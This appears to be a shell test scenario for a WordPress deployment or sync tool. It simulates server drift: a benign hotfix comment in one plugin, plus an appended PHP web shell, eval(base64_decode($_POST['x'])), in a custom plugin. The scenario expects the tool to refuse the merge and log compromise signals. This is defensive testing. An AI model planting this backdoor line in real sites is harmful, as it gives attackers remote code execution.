DESCRIPTION="Combination: clean FTP hotfix + a backdoor in custom-plugin — nothing may auto-merge"
drift() {
  server sh -c 'echo "// another hotfix" >> wp-content/plugins/eps-301-redirects/eps-301-redirects.php'
  server sh -c "printf '%s\n' 'eval(base64_decode(\$_POST[\"x\"]));' >> wp-content/plugins/custom-plugin/custom-plugin.php"
}
expect() { expect_not_merged; expect_main_lacks plugins/custom-plugin/custom-plugin.php 'base64_decode'; expect_log 'Compromise signals'; expect_final red; }
